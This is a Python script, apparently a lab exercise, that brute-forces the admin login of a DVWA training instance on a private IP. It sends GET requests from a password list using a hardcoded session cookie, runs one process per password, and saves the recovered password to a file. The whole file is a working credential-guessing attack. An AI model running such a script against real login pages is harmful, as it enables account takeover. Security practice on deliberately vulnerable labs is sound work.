import requests
from multiprocessing import Process
import time

def read_file(filename):
    password_list = []
    with open(filename, 'r') as file:
        for line in file:
            password_list.append(line.strip())  # 문자열 젤 앞 뒤 공백 제거
    return password_list

def brute_force(passwordList):
    url = f"http://192.168.60.136/dvwa/vulnerabilities/brute/"
    cookie = {
        "PHPSESSID" : "cd41f426a2991b4cffdb991f91e89db8",
        "security" : "medium"
    }
    
    for password in passwordList:
        print(f"input password: {password}")
        param = f"?username=admin&password={password}&Login=Login#"
        payload = url+param
        #print(payload)
        try:
            resp = requests.get(payload, cookies=cookie)
            if "Welcome" in resp.text:
                f = open("admin_password.txt", 'w')
                f.write(password)
                f.close()
                print(f"Password of the admin is: {password}")
                exit(0)
        except (Exception) as e:
            print(f"Error occurred: {e}")
    
    return "패스워드를 찾을 수 없습니다."


if __name__ == "__main__":
    start = int(time.time())
    
    print("Finding password:")
    
    file_name = "password_list.txt"
    password_list = read_file(file_name)
    procs = []
    for password in password_list:
        proc = Process(target=brute_force, args=([password],))
        procs.append(proc)
        proc.start()

    for proc in procs:
        proc.join()
    
    print(f"run time(sec) : {int(time.time()) - start}(sec)")